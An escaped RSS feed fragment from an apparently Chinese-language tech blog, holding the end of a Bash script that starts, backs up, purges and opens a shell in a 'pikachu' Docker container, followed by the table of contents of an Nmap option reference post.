&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;GREEN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;✓ 容器已删除（数据卷保留）&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;RED&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;✗ 删除容器失败&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;purge_all&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; check_docker
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;RED&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;警告: 这将删除容器和数据卷！&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;read&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;#34;确认删除？(y/N): &amp;#34;&lt;/span&gt; confirm
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$confirm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ ^&lt;span class="o"&gt;[&lt;/span&gt;Yy&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;正在删除容器...&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker rm -f &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; 2&amp;gt;/dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;正在删除数据卷...&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker volume rm &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VOLUME_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; 2&amp;gt;/dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;GREEN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;✓ 容器和数据卷已彻底删除&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;操作已取消&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;backup_volume&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; check_docker
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;BACKUP_DIR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;./backups&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;BACKUP_FILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;pikachu_backup_&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;date +%Y%m%d_%H%M%S&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;.tar.gz&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; mkdir -p &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKUP_DIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BLUE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;正在备份数据卷...&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 停止容器以确保数据一致性&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker stop &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; 2&amp;gt;/dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 创建备份&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker run --rm &lt;span class="se"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -v &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VOLUME_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;:/source &lt;span class="se"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -v &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKUP_DIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;:/backup &lt;span class="se"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; alpine tar czf /backup/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKUP_FILE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; -C /source .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 重新启动容器&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker start &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; 2&amp;gt;/dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;GREEN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;✓ 备份完成: &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKUP_DIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKUP_FILE&lt;/span&gt;&lt;span class="si"&gt;}${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ls -lh &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKUP_DIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKUP_FILE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;enter_shell&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; check_docker
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BLUE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;进入容器Shell...&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;YELLOW&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;按 Ctrl+D 或输入 exit 退出&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo docker &lt;span class="nb"&gt;exec&lt;/span&gt; -it &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CONTAINER_NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; /bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 主程序&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt; in
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; start&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; start_container
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; stop&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; stop_container
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; restart&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; restart_container
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; status&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; show_status
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; logs&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; show_logs
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; remove&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; remove_container
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; purge&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; purge_all
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; backup&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; backup_volume
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; shell&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; enter_shell
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; *&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; show_usage
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;esac&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description></item><item><title>【Kali Toolkit】Nmap（Network Mapper）</title><link>http://localhost:1313/p/kali-toolkitnmapnetwork-mapper/</link><pubDate>Tue, 30 Dec 2025 16:27:59 +0800</pubDate><guid>http://localhost:1313/p/kali-toolkitnmapnetwork-mapper/</guid><description>&lt;h1 id="nmap网络扫描工具"&gt;Nmap：网络扫描工具
&lt;/h1&gt;&lt;div class="custom-toc"&gt;
&lt;h3&gt;目录&lt;/h3&gt;
&lt;nav id="TableOfContents"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#目标选择与管理"&gt;目标选择与管理&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-il"&gt;&lt;code&gt;-iL&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-ir"&gt;&lt;code&gt;-iR&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--exclude"&gt;&lt;code&gt;--exclude&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--excludefile"&gt;&lt;code&gt;--excludefile&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--resume"&gt;&lt;code&gt;--resume&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#主机发现与存活探测"&gt;主机发现与存活探测&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-sn"&gt;&lt;code&gt;-sn&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-sp"&gt;&lt;code&gt;-sP&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-pn"&gt;&lt;code&gt;-Pn&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-ps"&gt;&lt;code&gt;-PS&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-pa"&gt;&lt;code&gt;-PA&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-pu"&gt;&lt;code&gt;-PU&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-pi"&gt;&lt;code&gt;-PI&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-p0"&gt;&lt;code&gt;-P0&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#端口扫描技术"&gt;端口扫描技术&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-ss"&gt;&lt;code&gt;-sS&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-st"&gt;&lt;code&gt;-sT&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-su"&gt;&lt;code&gt;-sU&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-sn-1"&gt;&lt;code&gt;-sN&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-sf"&gt;&lt;code&gt;-sF&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-sx"&gt;&lt;code&gt;-sX&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-si"&gt;&lt;code&gt;-sI&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#端口规范"&gt;端口规范&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-p"&gt;&lt;code&gt;-p&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-p-"&gt;&lt;code&gt;-p-&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--top-ports"&gt;&lt;code&gt;--top-ports&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-f"&gt;&lt;code&gt;-F&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#服务和版本探测"&gt;服务和版本探测&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-sv"&gt;&lt;code&gt;-sV&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--version-intensity"&gt;&lt;code&gt;--version-intensity&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#操作系统探测"&gt;操作系统探测&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-o"&gt;&lt;code&gt;-O&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-a"&gt;&lt;code&gt;-A&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#nse-脚本引擎"&gt;NSE 脚本引擎&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-sc----scriptdefault"&gt;&lt;code&gt;-sC&lt;/code&gt; / &lt;code&gt;--script=default&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-scriptlua-scripts"&gt;&lt;code&gt;-script=&amp;lt;Lua scripts&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-script-argsn1v1n2v2"&gt;&lt;code&gt;-script-args=&amp;lt;n1=v1,[n2=v2,...]&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#script-args-filefilename"&gt;&lt;code&gt;–script-args-file=filename&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#script-trace"&gt;&lt;code&gt;–script-trace&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#script-updatedb"&gt;&lt;code&gt;–script-updatedb&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#script-helpscripts"&gt;&lt;code&gt;–script-help=&amp;lt;scripts&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#输出格式与详情"&gt;输出格式与详情&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-on"&gt;&lt;code&gt;-oN&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-ox"&gt;&lt;code&gt;-oX&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-oa"&gt;&lt;code&gt;-oA&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--append-output"&gt;&lt;code&gt;--append-output&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-v---vv---d---dd"&gt;&lt;code&gt;-v&lt;/code&gt; / &lt;code&gt;-vv&lt;/code&gt; / &lt;code&gt;-d&lt;/code&gt; / &lt;code&gt;-dd&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#扫描结果筛选与解释"&gt;扫描结果筛选与解释&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#--open"&gt;&lt;code&gt;--open&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--reason"&gt;&lt;code&gt;--reason&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#调试与信息收集"&gt;调试与信息收集&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#--packet-trace"&gt;&lt;code&gt;--packet-trace&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
